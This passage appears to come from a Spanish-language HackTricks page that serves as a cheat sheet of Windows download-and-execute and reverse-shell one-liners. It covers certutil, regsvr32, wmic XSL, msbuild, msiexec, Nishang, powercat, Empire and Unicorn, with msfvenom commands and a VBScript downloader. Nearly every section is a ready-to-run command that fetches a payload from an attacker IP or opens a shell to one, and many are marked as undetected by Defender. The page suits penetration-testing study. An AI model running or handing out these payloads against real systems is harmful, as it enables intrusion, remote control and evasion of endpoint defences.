```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**Puedes descargar y ejecutar fácilmente un zombie Koadic utilizando el stager regsvr**

## Certutil

Descarga un archivo B64dll, descodifícalo y ejecútalo.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
Descarga un archivo B64exe, descodifícalo y ejecútalo.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Detectado por el defensor**



<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Sigue a HackenProof**](https://bit.ly/3xrrDrL) **para aprender más sobre errores web3**

🐞 Lee tutoriales sobre errores web3

🔔 Recibe notificaciones sobre nuevas recompensas por errores

💬 Participa en discusiones comunitarias

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**

Cscript is a command-line scripting engine provided by Microsoft. It is commonly used to execute VBScript or JScript scripts on Windows systems. Metasploit, on the other hand, is a popular penetration testing framework that includes various tools and exploits for testing the security of computer systems.

When it comes to using Cscript with Metasploit, there are several techniques that can be employed. One common approach is to use Cscript as a payload delivery method. This involves creating a malicious script that, when executed, will download and execute a Metasploit payload on the target system.

To accomplish this, you can use the `msfvenom` tool in Metasploit to generate a payload in a format that is compatible with Cscript. For example, you can create a VBScript payload using the following command:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your IP address> LPORT=<your port> -f vbs > payload.vbs
```

This command will generate a VBScript payload that establishes a reverse TCP connection to your specified IP address and port. The payload will be saved in a file named `payload.vbs`.

Once you have the payload, you can create a malicious script that will download and execute it on the target system using Cscript. Here is an example of such a script:

```vbs
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.open "GET", "http://<your IP address>/payload.vbs", False
objXMLHTTP.send

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile("C:\Temp\payload.vbs", True)
objFile.Write objXMLHTTP.responseText
objFile.Close

Set objShell = CreateObject("WScript.Shell")
objShell.Run "Cscript C:\Temp\payload.vbs"
```

In this script, the `objXMLHTTP` object is used to download the payload from your specified IP address. The `objFSO` object is then used to save the payload to a file on the target system. Finally, the `objShell` object is used to execute the payload using Cscript.

By using Cscript in conjunction with Metasploit, you can leverage the power of both tools to carry out effective penetration testing and exploit Windows systems.
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**Detectado por el defensor**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
Proceso que realiza una llamada de red: **svchost.exe**\
Carga útil escrita en disco: **caché local del cliente WebDAV**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**Detectado por el defensor**

## **MSIExec**

Atacante
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
Victima:
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**Detectado**

## **Wmic**
```
wmic os get /format:"https://webserver/payload.xsl"
```
Proceso que realiza una llamada de red: **wmic.exe**\
Carga útil escrita en disco: **caché local de IE**

Archivo xsl de ejemplo:
```
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
Extraído de [aquí](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)

**No detectado**

**Puedes descargar y ejecutar muy fácilmente un zombie Koadic utilizando el stager wmic**

## Msbuild
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
Proceso que realiza una llamada de red: **svchost.exe**\
Carga escrita en disco: **caché local del cliente WebDAV**

Puedes utilizar esta técnica para evadir la lista blanca de aplicaciones y las restricciones de Powershell.exe. Se te solicitará una shell de PS.\
Simplemente descarga esto y ejecútalo: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**No detectado**

## **CSC**

Compila código C# en la máquina víctima.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
Puedes descargar un shell inverso básico en C# desde aquí: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**No detectado**

## **Regasm/Regsvc**
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
Proceso que realiza una llamada de red: **svchost.exe**\
Carga útil escrita en disco: **caché local del cliente WebDAV**

**No lo he intentado**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf
```
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
Proceso que realiza una llamada de red: **svchost.exe**\
Carga escrita en disco: **caché local del cliente WebDAV**

**No lo he intentado**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Shells de Powershell

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

En la carpeta **Shells**, hay muchos shells diferentes. Para descargar y ejecutar Invoke-_PowerShellTcp.ps1_, haz una copia del script y añade al final del archivo:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
Comienza a servir el script en un servidor web y ejecútalo en el equipo de la víctima:
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Defender no lo detecta como código malicioso (aún, 3/04/2019).

**TODO: Verificar otros shells de nishang**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

Descargar, iniciar un servidor web, iniciar el escucha y ejecutarlo en el extremo de la víctima:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
El Defender no lo detecta como código malicioso (aún, 3/04/2019).

**Otras opciones ofrecidas por powercat:**

Conexiones de shell, shell inversa (TCP, UDP, DNS), redirección de puertos, subir/descargar archivos, generar payloads, servir archivos...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

Crea un lanzador de PowerShell, guárdalo en un archivo y descárgalo y ejecútalo.
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**Detectado como código malicioso**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Crea una versión en powershell de una puerta trasera de Metasploit utilizando unicornio.
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
Inicia msfconsole con el recurso creado:
```
msfconsole -r unicorn.rc
```
Inicie un servidor web que sirva el archivo _powershell\_attack.txt_ y ejecútelo en la víctima:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**Detectado como código malicioso**

## Más

[PS>Attack](https://github.com/jaredhaight/PSAttack) Consola de PS con algunos módulos ofensivos de PS precargados (cifrados)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) Consola de PS con algunos módulos ofensivos de PS y detección de proxy (IEX)

## Bibliografía

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

​

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Sigue a HackenProof**](https://bit.ly/3xrrDrL) **para aprender más sobre errores web3**

🐞 Lee tutoriales sobre errores web3

🔔 Recibe notificaciones sobre nuevas recompensas por errores

💬 Participa en discusiones comunitarias

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres que tu **empresa sea anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
